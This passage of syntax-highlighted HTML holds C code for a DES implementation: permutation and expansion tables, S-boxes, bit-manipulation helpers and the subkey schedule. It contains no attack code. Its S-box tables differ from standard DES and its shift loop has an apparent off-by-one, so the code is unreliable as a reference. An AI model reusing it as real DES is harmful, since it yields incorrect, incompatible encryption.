class="line">/*--------------------------------------------------------------------------------------------------------------*/</span><br><span class="line">const static ubyte PC2[] = &#123;</span><br><span class="line"> <span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>,  <span class="number">1</span>,  <span class="number">5</span>,</span><br><span class="line"> <span class="number">3</span>, <span class="number">28</span>, <span class="number">15</span>,  <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>,</span><br><span class="line"> <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>,  <span class="number">4</span>, <span class="number">26</span>,  <span class="number">8</span>,</span><br><span class="line"> <span class="number">16</span>,  <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>,  <span class="number">2</span>,</span><br><span class="line"> <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>,</span><br><span class="line"> <span class="number">30</span>, <span class="number">40</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>,</span><br><span class="line"> <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>, <span class="number">34</span>, <span class="number">53</span>,</span><br><span class="line"> <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span></span><br><span class="line">&#125;;</span><br><span class="line">/*--------------------------------------------------------------------------------------------------------------*/</span><br><span class="line">const static ubyte IP[] = &#123;</span><br><span class="line"> <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>,  <span class="number">2</span>,</span><br><span class="line"> <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>,  <span class="number">4</span>,</span><br><span class="line"> <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>,  <span class="number">6</span>,</span><br><span class="line"> <span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>,  <span class="number">8</span>,</span><br><span class="line"> <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>,  <span class="number">9</span>,  <span class="number">1</span>,</span><br><span class="line"> <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>,  <span class="number">3</span>,</span><br><span class="line"> <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>,  <span class="number">5</span>,</span><br><span class="line"> <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>,  <span class="number">7</span></span><br><span class="line">&#125;;</span><br><span class="line">/*--------------------------------------------------------------------------------------------------------------*/</span><br><span class="line">const static ubyte E[] = &#123;</span><br><span class="line"> <span class="number">32</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>,</span><br><span class="line"> <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>,</span><br><span class="line"> <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>,</span><br><span class="line"> <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>,</span><br><span class="line"> <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line"> <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>,</span><br><span class="line"> <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>,</span><br><span class="line"> <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>,  <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line">/*--------------------------------------------------------------------------------------------------------------*/</span><br><span class="line">const static ubyte S[][<span class="number">64</span>] = &#123;</span><br><span class="line"> &#123;</span><br><span class="line">                <span class="number">6</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">15</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="number">10</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">13</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="number">10</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">13</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="number">6</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">10</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="number">5</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">4</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="number">14</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">2</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="number">15</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">11</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="number">4</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">9</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">8</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">10</span>, <span class="number">13</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;;</span><br><span class="line">/*--------------------------------------------------------------------------------------------------------------*/</span><br><span class="line">const static ubyte P[] = &#123;</span><br><span class="line"> <span class="number">16</span>,  <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>,</span><br><span class="line"> <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>,</span><br><span class="line"> <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>,</span><br><span class="line"> <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>,</span><br><span class="line"> <span class="number">2</span>,  <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>,</span><br><span class="line"> <span class="number">32</span>, <span class="number">27</span>,  <span class="number">3</span>,  <span class="number">9</span>,</span><br><span class="line"> <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>,  <span class="number">6</span>,</span><br><span class="line"> <span class="number">22</span>, <span class="number">11</span>,  <span class="number">4</span>, <span class="number">25</span></span><br><span class="line">&#125;;</span><br><span class="line">/*--------------------------------------------------------------------------------------------------------------*/</span><br><span class="line">const static ubyte IP2[] = &#123;</span><br><span class="line"> <span class="number">40</span>,  <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>,</span><br><span class="line"> <span class="number">39</span>,  <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line"> <span class="number">38</span>,  <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>,</span><br><span class="line"> <span class="number">37</span>,  <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line"> <span class="number">36</span>,  <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>,</span><br><span class="line"> <span class="number">35</span>,  <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line"> <span class="number">34</span>,  <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>,</span><br><span class="line"> <span class="number">33</span>,  <span class="number">1</span>, <span class="number">41</span>,  <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span></span><br><span class="line">&#125;;</span><br><span class="line">/*--------------------------------------------------------------------------------------------------------------*/</span><br><span class="line">const static ubyte SHIFTS[] = &#123;</span><br><span class="line"> <span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line">/*--------------------------------------------------------------------------------------------------------------*/</span><br><span class="line">typedef struct &#123;</span><br><span class="line"> ubyte *data;</span><br><span class="line"> <span class="built_in">int</span> <span class="built_in">len</span>;</span><br><span class="line">&#125; String;</span><br><span class="line">/*--------------------------------------------------------------------------------------------------------------*/</span><br><span class="line">/*</span><br><span class="line">* Transform a single nibble into a <span class="built_in">hex</span> character</span><br><span class="line">*</span><br><span class="line">* <span class="keyword">in</span>: a value &lt; <span class="number">0x10</span></span><br><span class="line">*</span><br><span class="line">* returns: the character that represents the nibble</span><br><span class="line">*/</span><br><span class="line">static char toHex(ubyte <span class="keyword">in</span>) &#123;</span><br><span class="line"> <span class="keyword">if</span> (<span class="number">0x00</span> &lt;= <span class="keyword">in</span> &amp;&amp; <span class="keyword">in</span> &lt; <span class="number">0x0A</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;0&#x27;</span> + <span class="keyword">in</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">if</span> (<span class="number">0x0A</span> &lt;= <span class="keyword">in</span> &amp;&amp; <span class="keyword">in</span> &lt;= <span class="number">0x0F</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;A&#x27;</span> + <span class="keyword">in</span> - <span class="number">0x0A</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">/*--------------------------------------------------------------------------------------------------------------*/</span><br><span class="line">/*</span><br><span class="line">* Convert an array of <span class="built_in">bytes</span> into a string</span><br><span class="line">*</span><br><span class="line">* ptr: the array of <span class="built_in">bytes</span></span><br><span class="line">* <span class="built_in">len</span>: the number of <span class="built_in">bytes</span></span><br><span class="line">* out: a buffer allocated by the caller <span class="keyword">with</span> enough space <span class="keyword">for</span> <span class="number">2</span>*<span class="built_in">len</span>+<span class="number">1</span> characters</span><br><span class="line">*/</span><br><span class="line">static void printBytes(const ubyte *ptr, <span class="built_in">int</span> <span class="built_in">len</span>, char *out) &#123;</span><br><span class="line"> <span class="keyword">while</span> (<span class="built_in">len</span>-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line">  *out++ = toHex(*ptr &gt;&gt; <span class="number">4</span>);</span><br><span class="line">  *out++ = toHex(*ptr &amp; <span class="number">0x0F</span>);</span><br><span class="line"></span><br><span class="line">  ptr++;</span><br><span class="line"> &#125;</span><br><span class="line"> *out = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">/*--------------------------------------------------------------------------------------------------------------*/</span><br><span class="line">/*</span><br><span class="line">* Gets the value of a bit <span class="keyword">in</span> an array of <span class="built_in">bytes</span></span><br><span class="line">*</span><br><span class="line">* src: the array of <span class="built_in">bytes</span> to index</span><br><span class="line">* index: the desired bit to test the value of</span><br><span class="line">*</span><br><span class="line">* returns: the bit at the specified position <span class="keyword">in</span> the array</span><br><span class="line">*/</span><br><span class="line">static <span class="built_in">int</span> peekBit(const ubyte *src, <span class="built_in">int</span> index) &#123;</span><br><span class="line"> <span class="built_in">int</span> cell = index / <span class="number">8</span>;</span><br><span class="line"> <span class="built_in">int</span> bit = <span class="number">7</span> - index % <span class="number">8</span>;</span><br><span class="line"> <span class="keyword">return</span> (src[cell] &amp; (<span class="number">1</span> &lt;&lt; bit)) != <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">/*--------------------------------------------------------------------------------------------------------------*/</span><br><span class="line">/*</span><br><span class="line">* Sets the value of a bit <span class="keyword">in</span> an array of <span class="built_in">bytes</span></span><br><span class="line">*</span><br><span class="line">* dst: the array of bits to <span class="built_in">set</span> a bit <span class="keyword">in</span></span><br><span class="line">* index: the position of the bit to <span class="built_in">set</span></span><br><span class="line">* value: the value <span class="keyword">for</span> the bit to <span class="built_in">set</span></span><br><span class="line">*/</span><br><span class="line">static void pokeBit(ubyte *dst, <span class="built_in">int</span> index, <span class="built_in">int</span> value) &#123;</span><br><span class="line"> <span class="built_in">int</span> cell = index / <span class="number">8</span>;</span><br><span class="line"> <span class="built_in">int</span> bit = <span class="number">7</span> - index % <span class="number">8</span>;</span><br><span class="line"> <span class="keyword">if</span> (value == <span class="number">0</span>) &#123;</span><br><span class="line">  dst[cell] &amp;= ~(<span class="number">1</span> &lt;&lt; bit);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span> &#123;</span><br><span class="line">  dst[cell] |= (<span class="number">1</span> &lt;&lt; bit);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">/*--------------------------------------------------------------------------------------------------------------*/</span><br><span class="line">/*</span><br><span class="line">* Transforms one array of <span class="built_in">bytes</span> by shifting the bits the specified number of positions</span><br><span class="line">*</span><br><span class="line">* src: the array to shift bits <span class="keyword">from</span></span><br><span class="line">* <span class="built_in">len</span>: the length of the src array</span><br><span class="line">* times: the number of positions that the bits should be shifted</span><br><span class="line">* dst: a <span class="built_in">bytes</span> array allocated by the caller to store the shifted values</span><br><span class="line">*/</span><br><span class="line">static void shiftLeft(const ubyte *src, <span class="built_in">int</span> <span class="built_in">len</span>, <span class="built_in">int</span> times, ubyte *dst) &#123;</span><br><span class="line"> <span class="built_in">int</span> i, t;</span><br><span class="line"> <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt;= <span class="built_in">len</span>; ++i) &#123;</span><br><span class="line">  pokeBit(dst, i, peekBit(src, i));</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">for</span> (t = <span class="number">1</span>; t &lt;= times; ++t) &#123;</span><br><span class="line">  <span class="built_in">int</span> temp = peekBit(dst, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= <span class="built_in">len</span>; ++i) &#123;</span><br><span class="line">   pokeBit(dst, i - <span class="number">1</span>, peekBit(dst, i));</span><br><span class="line">  &#125;</span><br><span class="line">  pokeBit(dst, <span class="built_in">len</span> - <span class="number">1</span>, temp);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">/*--------------------------------------------------------------------------------------------------------------*/</span><br><span class="line">/*</span><br><span class="line">* Calculates the sub keys to be used <span class="keyword">in</span> processing the messages</span><br><span class="line">*</span><br><span class="line">* key: the array of <span class="built_in">bytes</span> representing the key</span><br><span class="line">* ks: the subkeys that have been allocated by the caller</span><br><span class="line">*/</span><br><span class="line">typedef ubyte subkey_t[<span class="number">17</span>][<span class="number">6</span>]; /* <span class="number">17</span> sets of <span class="number">48</span> bits */</span><br><span class="line">static void getSubKeys(const key_t key, subkey_t ks) &#123;</span><br><span class="line"> ubyte c[<span class="number">17</span>][<span class="number">7</span>];  /* <span class="number">56</span> bits */</span><br><span class="line"> ubyte d[<span class="number">17</span>][<span class="number">4</span>];  /* <span class="number">28</span> bits */</span><br><span class="line"> ubyte kp[<span class="number">7</span>];</span><br><span class="line"> <span class="built_in">int</span> i, j;</span><br><span class="line"></span><br><span class="line"> /* intialize */</span><br><span class="line"> memset(c, <span class="number">0</span>, sizeof(c));</span><br><span class="line"> memset(d, <span class="number">0</span>, sizeof(d));</span><br><span class="line"> memset(ks, <span class="number">0</span>, sizeof(subkey_t));</span><br><span class="line"></span><br><span class="line"> /* permute <span class="string">&#x27;key&#x27;</span> using table PC1 */</span><br><span class="line"> <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">56</span>; ++i) &#123;</span><br><span class="line">  pokeBit(kp, i, peekBit(key, PC1[i] - <span class="number">1</span>));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> /* split <span class="string">&#x27;kp&#x27;</span> <span class="keyword">in</span> half <span class="keyword">and</span> process the resulting series of <span class="string">&#x27;c&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;d&#x27;</span> */</span><br><span class="line"> <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">28</span>; ++i) &#123;</span><br><span class="line">  pokeBit(c[<span class="number">0</span>], i, peekBit(kp, i));</span><br><span class="line">  pokeBit(d[<span class="number">0</span>], i, peekBit(kp, i + <span class="number">28</span>));</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> /* shift the components of c <span class="keyword">and</span> d */</span><br><span class="line"> <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">17</span>; ++i) &#123;</span><br><span class="line">  shiftLeft(c[i - <span class="number">1</span>], <span class="number">28</span>, SHIFTS[i - <span class="number">1</span>], c[i]);</span><br><span class="line">  shiftLeft(d[i - <span class="number">1</span>], <span class="number">28</span>, SHIFTS[i - <span class="number">1</span>], d[i]);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> /* merge <span class="string">&#x27;d&#x27;</span> into <span class="string">&#x27;c&#x27;</span> */</span><br><span class="line"> <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">17</span>; ++i) &#123;</span><br><span class="line">  <span class="keyword">for</span> (j = <span class="number">28</span>; j &lt; <span class="number">56</span>; ++j) &#123;</span><br><span class="line">   pokeBit(c[i], j, peekBit(d[i], j - <span class="number">28</span>));</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> /* form the sub-keys <span class="keyword">and</span> store them <span class="keyword">in</span> <span class="string">&#x27;ks&#x27;</span></span><br><span class="line"> * permute <span class="string">&#x27;c&#x27;</span> using table PC2 */</span><br><span class="line"> <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">17</span>; ++i) &#123;</span><br><span class="line">  <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">48</span>; ++j) &#123;</span><br><span class="line">   pokeBit(ks[i], j, peekBit(c[i], PC2[j] - <span class="number">1</span>));</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">/*--------------------------------------------------------------------------------------------------------------*/</span><br><span class="line">/*</span><br><span class="line">* Function used <span class="keyword">in</span> processing the messages</span><br><span 